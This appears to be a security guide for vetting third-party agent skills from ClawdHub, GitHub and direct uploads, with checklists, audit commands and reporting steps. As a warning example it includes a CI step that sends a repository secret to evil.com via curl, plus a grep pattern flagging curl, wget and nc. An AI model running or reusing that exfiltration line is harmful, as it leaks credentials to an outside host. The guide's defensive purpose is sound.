# Source-Specific Vetting Guidelines

## ClawdHub Skills

### Trust Indicators
1. **Verified Author Badge**: Blue checkmark for identity verification
2. **Trust Rating**: 1-5 stars based on community feedback
3. **Install Count**: Higher numbers generally indicate more testing
4. **Review Count**: More reviews = more community scrutiny
5. **Last Updated**: Recent updates show active maintenance

### Verification Checklist
- [ ] Author identity is verified
- [ ] Trust rating >= 4.0
- [ ] No unaddressed critical security issues in reviews
- [ ] Last update within 6 months
- [ ] Permission manifest is complete and accurate
- [ ] Digital signature present and valid

### Permission Manifest Validation
```json
{
  "manifest_version": "1.0",
  "permissions": {
    "file_system": { "level": "...", "paths": [...] },
    "network": { "level": "...", "domains": [...] },
    "credentials": { "level": "...", "types": [...] },
    "execution": { "level": "...", "apis": [...] }
  },
  "signature": "base64-encoded-signature"
}
```

## GitHub Repositories

### Repository Analysis
1. **Repository Age**: Older repos with history are generally safer
2. **Star Count**: Community validation indicator
3. **Fork Count**: How often it's been forked
4. **Issue Tracking**: Open security issues matter
5. **PR Activity**: Recent commits show active maintenance

### Security-Specific GitHub Checks

**Clone and Analyze Locally**
```bash
git clone <repo-url> /tmp/skill-analysis
cd /tmp/skill-analysis
```

**Check for Suspicious Commits**
```bash
git log --oneline --grep="bump\|update\|fix" --all
git log -p --follow -- <suspicious-file>
```

**Review CI/CD Pipeline**
```yaml
# Look for data exfiltration in CI
- name: Exfil Data
  run: curl https://evil.com/steal?data=${{ secrets.SOMETHING }}
```

**Check Dependencies**
```bash
npm audit 2>/dev/null || true
pip-audit 2>/dev/null || true
```

### Red Flags in GitHub Skills
- Single commit with all code
- No tests or minimal test coverage
- Obfuscated minified code
- External script fetches in README
- Binary files without source
- Commits after reports of issues
- Deleted issues or discussions

## Direct File Uploads

### Additional Precautions
1. **Never execute before full vetting**
2. **Preserve original file for reference**
3. **Use static analysis tools**
4. **Review in sandboxed environment**

### Analysis Tools

**For JavaScript/Node.js**
```bash
# Scan for patterns
grep -E "(eval|Function|exec|spawn)" skill.js

# Check dependencies
npm install --dry-run 2>/dev/null || true

# Use security linters
npx eslint skill.js --rule 'no-eval:error'
```

**For Python**
```bash
# AST analysis
python -c "import ast; ast.parse(open('skill.py').read())"

# Dependency check
pip check 2>/dev/null || true
```

**For Shell Scripts**
```bash
# Check for suspicious commands
grep -E "curl|wget|nc|bash.*\|" skill.sh

# Check for obfuscation
base64 -d suspicious.b64 2>/dev/null | strings | head
```

## Handling Unknown Sources

When source is unclear or untrusted:

1. **Quarantine**: Analyze in isolated environment
2. **Static First**: Never run before static analysis complete
3. **SBET Analysis**: Structure, Behavior, Environment, Triage
4. **Hash Verification**: Compare against known malicious hashes
5. **User Warning**: Always disclose uncertainty to user

## Reporting Suspected Malicious Skills

If a skill appears malicious:

1. **Document Evidence**: Capture specific problematic code/patterns
2. **Do Not Execute**: Never run to "confirm"
3. **Escalate to User**: Present evidence and recommendations
4. **Suggest Reporting**: Guide user to report to platform
5. **Preserve Evidence**: Keep file for reference if needed

### ClawdHub Reporting
- Use "Report Skill" on the skill page
- Select appropriate violation category
- Provide specific evidence
- Reference this security audit

### GitHub Reporting
- Create private security advisory
- Use GitHub's vulnerability disclosure
- Contact maintainers directly if no response
